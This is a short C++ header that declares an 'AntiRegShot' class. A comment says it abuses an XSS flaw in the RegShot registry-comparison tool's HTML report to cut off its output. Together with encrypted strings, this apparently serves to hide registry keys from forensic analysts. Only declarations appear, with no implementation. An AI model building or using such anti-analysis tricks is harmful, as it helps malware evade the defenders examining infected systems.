#pragma once
#include <Windows.h>
#include <string>
#include <algorithm>
#include "StringEncrypt.h"

struct RegKeyInfo {
	HKEY key;
	std::wstring path;
	std::wstring keyName;
};

class AntiRegShot
{
private:
	RegKeyInfo targetKey;
	//XSS vuln, cut off the regshot output when using HTML option
	std::wstring xssComment_open, xssComment_close;
	std::wstring *SplitPathFile(std::wstring fullKeyPath);
public:	
	bool HideKeyHTML();
	AntiRegShot();
	AntiRegShot(HKEY key, std::wstring keyName);
	~AntiRegShot();
};
